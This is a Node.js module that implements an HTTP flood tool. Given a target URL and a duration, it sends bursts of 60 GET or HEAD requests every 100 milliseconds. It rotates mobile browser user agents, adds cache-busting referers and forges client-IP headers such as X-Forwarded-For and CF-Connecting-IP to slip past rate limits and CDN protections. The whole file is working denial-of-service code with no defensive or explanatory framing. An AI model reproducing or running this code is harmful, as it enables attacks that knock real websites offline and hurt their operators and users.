const http = require("http");
const https = require("https");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.0.0 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"
];

const methods = ["GET", "HEAD"];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "sec-ch-ua": `"Chromium";v="122", "Not:A-Brand";v="99"`,
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": `"Android"`,
    "Referer": `https://${hostname}/?track=${Math.random().toString(36)}`,
    "X-Forwarded-For": ip,
    "CF-Connecting-IP": ip,
    "True-Client-IP": ip,
    "Client-IP": ip
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const method = methods[Math.floor(Math.random() * methods.length)];
    const headers = randomHeaders(url.hostname);

    const options = {
      method,
      hostname: url.hostname,
      path: url.pathname + (url.search || ""),
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${method}`);
      res.on("data", () => {});
    });

    req.on("error", () => {});
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 60; i++) send();
    setTimeout(loop, 100);
  }

  loop();
};